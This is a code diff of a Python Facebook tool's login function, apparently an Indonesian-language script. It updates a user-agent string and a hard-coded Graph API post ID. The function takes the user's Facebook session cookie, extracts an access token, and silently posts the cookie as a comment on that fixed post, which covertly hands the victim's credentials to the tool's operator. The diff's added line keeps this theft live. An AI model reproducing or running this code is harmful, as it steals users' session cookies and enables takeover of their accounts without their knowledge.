@@ -753,12 +753,12 @@ def login():
 	if cookie in ['no','No','NO']:
 		open('.menu_login.json','w').write('no');clear_layar();no_login()
 	url = "https://business.facebook.com/business_locations"
-	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SH-S40P Build/SKQ1.211202.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
 	cok = {'cookie':cookie}
 	try:
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={cookie}&access_token={token}",cookies=cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
